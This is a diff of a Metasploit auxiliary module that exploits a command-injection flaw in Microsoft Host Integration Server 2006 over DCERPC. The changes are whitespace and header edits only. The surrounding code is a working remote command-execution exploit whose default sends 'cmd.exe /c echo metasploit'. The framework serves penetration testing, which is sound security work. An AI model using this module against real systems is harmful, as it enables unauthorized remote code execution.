@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -12,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::DCERPC
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Microsoft Host Integration Server 2006 Command Execution Vulnerability.',
 			'Description'    => %q{
 					This module exploits a command-injection vulnerability in Microsoft Host Integration Server 2006.
@@ -33,12 +37,12 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Oct 14 2008'))
 
-			register_options( 
-				[ 
+			register_options(
+				[
 				Opt::RPORT(0),
 				OptString.new('COMMAND', [ true, 'The command to execute', 'cmd.exe']),
-				OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])				
-				], self.class )	
+				OptString.new('ARGS', [ true, 'The arguments to the command', '/c echo metasploit > metasploit.txt'])
+				], self.class )
 	end
 
 	def run
@@ -53,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		if (dport == 0)
 
 			dport = dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.0', 'ncacn_ip_tcp')
-			dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp') 
+			dport ||= dcerpc_endpoint_find_tcp(datastore['RHOST'], 'ed6ee250-e0d1-11cf-925a-00aa00c006c1', '1.1', 'ncacn_ip_tcp')
 
 			if (not dport)
 				print_status("Could not determine the RPC port used by the Service.")
@@ -72,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Bound to #{handle} ...")
 
 		cmd =  NDR.string("#{datastore['COMMAND']}") + NDR.string("#{datastore['ARGS']}")
-	
+
 		print_status("Sending command: #{datastore['COMMAND']} #{datastore['ARGS']}")
 
 			begin
@@ -81,7 +85,7 @@ class Metasploit3 < Msf::Auxiliary
 			end
 
 		disconnect
-			
+
 	end
 end
 =begin
